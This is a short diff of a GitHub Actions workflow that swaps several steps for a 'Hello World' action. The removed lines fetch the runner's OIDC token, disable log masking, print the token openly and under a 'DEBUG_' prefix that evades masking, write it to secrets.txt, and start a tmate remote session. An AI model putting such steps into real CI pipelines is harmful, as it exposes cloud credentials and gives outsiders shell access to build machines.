@@ -27,33 +27,5 @@ jobs:
       - name: Run a one-line script
         run: echo Hello, world!
 
-      - uses: vibj/hello-gha@v2
-        with:
-          name: "Arjun"
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
-      - name: Set execute permission for init.sh
-        run: chmod +x $GITHUB_WORKSPACE/init.sh
-
-      # Run a script from the repository
-      - name: Run a script from repository
-        run: $GITHUB_WORKSPACE/init.sh
-
-      - name: Fetch and print OIDC token
-        env:
-          ACTIONS_ID_TOKEN_REQUEST_URL: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_URL }}
-          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
-        run: |
-          echo "Fetching OIDC Token..."
-          OIDC_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
-          echo "::echo::off"  # Disable masking
-          echo "OIDC Token: $OIDC_TOKEN"
-          echo "::echo::on"   # Re-enable masking
-          echo "OIDC Token (for debugging): DEBUG_$OIDC_TOKEN"
-          echo $OIDC_TOKEN >> secrets.txt
-      - name: Run tmate
-        uses: mxschmitt/action-tmate@v2
+      - name: Run Hello World Action
+        uses: vibj/helloworld-action@main
